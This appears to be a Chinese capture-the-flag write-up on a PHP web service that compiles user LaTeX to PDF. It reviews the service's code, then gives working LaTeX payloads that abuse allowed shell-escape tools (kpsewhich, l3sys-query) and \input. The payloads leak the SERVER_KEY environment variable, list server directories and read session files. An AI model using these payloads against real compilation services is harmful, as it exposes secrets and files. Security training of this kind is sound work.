<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">EditorState</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@codemirror/state&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">EditorView</span>, lineNumbers, keymap &#125; <span class="keyword">from</span> <span class="string">&#x27;@codemirror/view&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; defaultKeymap, historyKeymap, insertTab, history &#125; <span class="keyword">from</span> <span class="string">&#x27;@codemirror/commands&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">StreamLanguage</span>, indentOnInput &#125; <span class="keyword">from</span> <span class="string">&#x27;@codemirror/language&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; closeBrackets, closeBracketsKeymap &#125; <span class="keyword">from</span> <span class="string">&#x27;@codemirror/autocomplete&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; stex &#125; <span class="keyword">from</span> <span class="string">&#x27;@codemirror/legacy-modes/mode/stex&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; dracula &#125; <span class="keyword">from</span> <span class="string">&#x27;@uiw/codemirror-theme-dracula&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createEditorState</span>(<span class="params">initialContent</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> extensions = [</span><br><span class="line">        dracula,</span><br><span class="line">        <span class="title class_">EditorView</span>.<span class="property">lineWrapping</span>,</span><br><span class="line">        <span class="title function_">lineNumbers</span>(),</span><br><span class="line">        <span class="title function_">indentOnInput</span>(),</span><br><span class="line">        <span class="title function_">history</span>(),</span><br><span class="line">        <span class="title function_">closeBrackets</span>(),</span><br><span class="line">        <span class="title class_">StreamLanguage</span>.<span class="title function_">define</span>(stex),</span><br><span class="line">        keymap.<span class="title function_">of</span>([</span><br><span class="line">            &#123; <span class="attr">key</span>: <span class="string">&#x27;Tab&#x27;</span>, <span class="attr">run</span>: insertTab &#125;,</span><br><span class="line">            ...defaultKeymap,</span><br><span class="line">            ...historyKeymap,</span><br><span class="line">            ...closeBracketsKeymap</span><br><span class="line">        ])</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">EditorState</span>.<span class="title function_">create</span>(&#123;</span><br><span class="line">        <span class="attr">doc</span>: initialContent,</span><br><span class="line">        extensions</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createEditorView</span>(<span class="params">state, parent</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EditorView</span>(&#123; state, parent &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; createEditorState, createEditorView &#125;;</span><br></pre></td></tr></table></figure>

<p>这里写的是编辑器的东西，也就是网页的那个框框的语法之类的，但是其中有个问题，就是引入了LaTeX语法支持(旧版模式)<code>@codirror/legacy-modes/mode/stex</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*compile.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;helper.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Ramsey</span>\<span class="title">Uuid</span>\<span class="title">Uuid</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">return_pdf</span>(<span class="params"><span class="variable">$pdf</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/pdf&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: inline; filename=&quot;paper.pdf&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$pdf</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">init_session</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$compUuid</span> = <span class="title class_">Uuid</span>::<span class="title function_ invoke__">uuid4</span>()-&gt;<span class="title function_ invoke__">toString</span>();</span><br><span class="line"><span class="variable">$sessUuid</span> = <span class="title function_ invoke__">decrypt_text</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uuid&#x27;</span>], <span class="variable">$serverKey</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">decrypt_text</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;key&#x27;</span>], <span class="variable">$serverKey</span>);</span><br><span class="line"><span class="variable">$latex</span> = <span class="title function_ invoke__">decrypt_text</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;latex&#x27;</span>], <span class="variable">$serverKey</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/var/tmp/<span class="subst">$compUuid</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/tmp&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">$sessUuid</span>.tex.enc&quot;</span>) &amp;&amp; </span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">$sessUuid</span>.text.enc&quot;</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">decrypt_text</span>(<span class="string">&quot;<span class="subst">$sessUuid</span>.tex.enc&quot;</span>, <span class="variable">$key</span>) == <span class="variable">$latex</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="title function_ invoke__">return_pdf</span>(<span class="title function_ invoke__">decrypt_file</span>(<span class="string">&quot;<span class="subst">$sessUuid</span>.pdf.enc&quot;</span>, <span class="variable">$key</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;mkdir <span class="subst">$dir</span>&quot;</span>);</span><br><span class="line"><span class="variable">$texFile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">$dir</span>/paper.tex&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$texFile</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$texFile</span>, <span class="variable">$latex</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$texFile</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;pdflatex -halt-on-error -output-directory <span class="subst">$dir</span> <span class="subst">$dir</span>/paper.tex&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$returnCode</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Compilation failed.&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">encrypt_file</span>(<span class="string">&quot;<span class="subst">$dir</span>/paper.pdf&quot;</span>, <span class="string">&quot;<span class="subst">$sessUuid</span>.pdf.enc&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="title function_ invoke__">encrypt_file</span>(<span class="string">&quot;<span class="subst">$dir</span>/paper.tex&quot;</span>, <span class="string">&quot;<span class="subst">$sessUuid</span>.tex.enc&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;rm -rf <span class="subst">$dir</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">return_pdf</span>(<span class="title function_ invoke__">decrypt_file</span>(<span class="string">&quot;<span class="subst">$sessUuid</span>.pdf.enc&quot;</span>, <span class="variable">$key</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.<strong>解密输入</strong> → 2. <strong>检查缓存</strong> → 3. <strong>无缓存时编译 LaTeX</strong> → 4. <strong>缓存结果并 PDF</strong>。将我们输入的内容放进tmp里面然后通过PDF打印出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*helper.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Ramsey</span>\<span class="title">Uuid</span>\<span class="title">Uuid</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serverKey</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;SERVER_KEY&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt_file</span>(<span class="params"><span class="variable">$inputPath</span>, <span class="variable">$outputPath</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&quot;openssl enc -aes-256-ctr -salt -pbkdf2 -in <span class="subst">$inputPath</span> -out <span class="subst">$outputPath</span> -pass pass:<span class="subst">$key</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;openssl enc -d -aes-256-ctr -pbkdf2 -in <span class="subst">$path</span> -out /dev/stdout -pass pass:<span class="subst">$key</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt_text</span>(<span class="params"><span class="variable">$plaintext</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-256-ctr&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">random_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$ciphertext</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plaintext</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span> . <span class="variable">$ciphertext</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_text</span>(<span class="params"><span class="variable">$enctext</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-256-ctr&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$enctext</span>);</span><br><span class="line">    <span class="variable">$ivLength</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$ivLength</span>);</span><br><span class="line">    <span class="variable">$ciphertext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$ivLength</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$ciphertext</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$serverKey</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uuid&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$uuid</span> = <span class="title class_">Uuid</span>::<span class="title function_ invoke__">uuid4</span>()-&gt;<span class="title function_ invoke__">toString</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;uuid&#x27;</span>] = <span class="title function_ invoke__">encrypt_text</span>(<span class="variable">$uuid</span>, <span class="variable">$serverKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="title function_ invoke__">encrypt_text</span>(<span class="variable">$key</span>, <span class="variable">$serverKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;latex&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$latex</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;template.tex&#x27;</span>);</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;latex&#x27;</span>] = <span class="title function_ invoke__">encrypt_text</span>(<span class="variable">$latex</span>, <span class="variable">$serverKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>进行一个会话加密，并且我们得知<code>SERVER_KEY</code>在环境变量中，查看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*index.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;helper.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">init_session</span>();</span><br><span class="line"><span class="variable">$latex</span> = <span class="title function_ invoke__">decrypt_text</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;latex&#x27;</span>], <span class="variable">$serverKey</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>检测session</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> data = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span><br><span class="line">                data.<span class="title function_">append</span>(<span class="string">&#x27;latex&#x27;</span>, view.<span class="property">state</span>.<span class="property">doc</span>.<span class="title function_">toString</span>());</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/update.php&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,</span><br><span class="line">                    <span class="attr">body</span>: data.<span class="title function_">toString</span>()</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">                iframe.<span class="property">contentWindow</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> initialState = cm6.<span class="title function_">createEditorState</span>(&lt;?= <span class="title function_">json_encode</span>($latex) ?&gt;);</span><br><span class="line">            <span class="keyword">const</span> view = cm6.<span class="title function_">createEditorView</span>(initialState, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;editor&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">ctrlKey</span> &amp;&amp; e.<span class="property">key</span> === <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">                    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">                    <span class="title function_">compile</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>默认加载 <code>compile.php</code>来编译生成PDF，最后看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*update.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;helper.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">init_session</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;latex&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Bad Request: Missing LaTeX.&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;latex&#x27;</span>] = <span class="title function_ invoke__">encrypt_text</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;latex&#x27;</span>], <span class="variable">$serverKey</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看完了所有代码发现是<code>--no-shell-escape</code>，就是不允许执行命令，但是这些命令是允许的</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="built_in">_</span>escape<span class="built_in">_</span>commands = <span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>bibtex,bibtex8,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>extractbb,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>gregorio,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>kpsewhich,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>l3sys-query,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>latexminted,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>makeindex,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>memoize-extract.pl,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>memoize-extract.py,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>repstopdf,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>r-mpost,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>texosquery-jre8,<span class="keyword">\</span></span><br></pre></td></tr></table></figure>

<p><code>bibtex</code> 和 <code>bibtex8</code>：用于处理 LaTeX 文档中的引用和参考文献。</p>
<p><code>extractbb</code>：用于提取图形的边界框。</p>
<p><code>gregorio</code>：与 Gregorian 调式相关的工具，通常用于音乐排版。</p>
<p><code>kpsewhich</code>：一个非常常见的 LaTeX 工具，用于查找文件路径，可以用于读取环境变量和系统信息。</p>
<p><code>l3sys-query</code>：用于获取系统信息的工具，在某些情况下可以用来列出系统文件或目录。</p>
<p><code>latexminted</code>：用于处理 <code>minted</code> 宏包的工具，支持高亮代码。</p>
<p><code>makeindex</code>：用于处理索引的工具。</p>
<p><code>memoize-extract.pl</code> 和 <code>memoize-extract.py</code>：可能是自定义的脚本，用于提取缓存或存储的文件。</p>
<p><code>repstopdf</code>：一个将图像文件转换为 PDF 格式的工具。</p>
<p><code>r-mpost</code>：可能是与 LaTeX 的元后处理相关的工具。</p>
<p><code>texosquery-jre8</code>：与 Java 相关的工具，可能用于查询 LaTeX 环境的设置或路径。</p>
<p>有用的只有读取环境变量和列目录，我们先查看SERVER_KEY</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\documentclass</span>&#123;article&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;catchfile&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\CatchFileDef</span>&#123;<span class="keyword">\key</span>&#125;&#123;|kpsewhich -expand-var=<span class="built_in">$</span>SERVER<span class="built_in">_</span>KEY&#125;&#123;&#125;</span><br><span class="line">The key is: <span class="keyword">\key</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p>得到以下内容</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-124148.jpg" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The key is: 3c8ea83acb09113c8074e33639d2e76517982ade78ca3683f4a46b456bd623da</span><br></pre></td></tr></table></figure>

<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\documentclass</span>&#123;article&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;catchfile&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;verbatim&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\verbatiminput</span>&#123;|l3sys-query ls --sort d&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到当前目录的文件信息，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./sess_9e1ae23eeff86c6d4bb3a02f57efc3ab</span><br><span class="line">./sess_dfd8e7498c59b317211ad2f7ea8c1a0c</span><br><span class="line">./d1ff57e0-9f5f-4521-9909-1c635c3ddca9.pdf.enc</span><br><span class="line">./d1ff57e0-9f5f-4521-9909-1c635c3ddca9.tex.enc</span><br><span class="line">./sess_643fb224f021bb019dc5ea80e19a7cc1</span><br><span class="line">./925ebc41-19c8-41cb-831f-4cda7dc9d365.pdf.enc</span><br><span class="line">./925ebc41-19c8-41cb-831f-4cda7dc9d365.tex.enc</span><br><span class="line">./sess_aa74cb226521a799aab422e412f22a40</span><br></pre></td></tr></table></figure>

<p>但是用处不大，现在我们根本不知道怎么去获得flag，后面查到可以利用<code>input</code>和<code>attachfile</code>读取文件</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\documentclass</span>&#123;article&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\input</span>&#123;./sess<span class="built_in">_</span>6afed1c55d206558beb1174d929bed91&#125;</span><br><span class="line"><span class="keyword">\input</span>&#123;./sess<span class="built_in">_</span>62c82309abb8bc56ccb314d153ee4bfa&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>attachfile</code>是插入内容，所以这里并不适用，不过还是写一下怎么用的</p>
